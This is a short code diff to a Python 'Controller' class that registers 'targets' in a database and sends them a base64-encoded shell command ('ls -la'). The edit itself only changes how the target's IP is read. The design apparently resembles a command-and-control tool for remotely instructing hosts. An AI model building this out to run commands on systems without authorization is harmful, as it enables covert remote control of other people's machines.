@@ -32,11 +32,11 @@ class Controller(Host):
                     }
 
                 self.db.insert(target)
-                self.send(target.ip, "join", "fine thank you")
+                self.send(target['ip'], "join", "fine thank you")
                 Target = Query()
                 print(self.db.search(Target.ip == '192.168.157.10'))
                 #self.db.update()
-                self.send(target.ip, "instruction", "request", base64.b64encode("ls -la".encode()))
+                self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))
             case _:
                 print("Invalid join message")
         return
